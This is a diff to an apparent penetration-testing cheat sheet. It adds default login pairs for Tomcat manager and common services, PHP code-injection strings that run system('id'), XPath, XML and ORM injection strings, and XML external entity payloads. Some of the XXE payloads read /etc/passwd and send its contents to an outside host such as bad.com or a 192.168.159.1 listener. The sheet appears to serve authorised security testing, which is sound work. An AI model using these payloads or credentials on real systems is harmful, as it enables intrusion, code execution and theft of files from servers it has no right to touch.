@@ -32,7 +32,7 @@ config.inc.php*
 wp-config.php*
 
 Authentication
-        Tomcat manager, try default credentials: tomcat/tomcat
+        Tomcat manager, try default credentials: tomcat/tomcat, admin/manager, admin/password, admin/s3cret, admin (emtpy password).
         Try password reuse between services
         Google default credentials for app
 
@@ -116,11 +116,23 @@ foo']%00
 foo' or 1=1]%00
 '%20or%201=1]/child::node()%00*
 
-classic xxe
+PHP code injection
+    *".system('id'); $a="
+".system('id');#
+".system('id');//
+foo);}system('id');//
+'.phpinfo().'*
+
+XML External Entity
     *<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > <!ENTITY callhome SYSTEM "bad.com/?%xxe;"> ] > <foo>&xxe;&callhome;</foo>*
     *<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > ] > <foo>&xxe;</foo>*
+    Send **/etc/passwd** to your box:
+    *<!ENTITY % p1 SYSTEM "file:///etc/passwd"><!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.159.1:3001/BLAH?%p1;'>">%p2;*
 
-
+XML Injection
+    **<!--/-->**
+ORM Injection
+    **OR 1--**
 RFI/LFI
     Test it:
     *$ fimap -u "http://$ip/example.php?test="*
@@ -216,10 +228,12 @@ Test credentials
     admin password
     admin <blank>
     admin nameofservice
+    admin s3cret
     root root
     root admin
     root password
     root nameofservice
+    root s3cret
 
 Other tricks
     If there is a share link or a way to pass a URL that you can manipulate, try duplicating the parameters
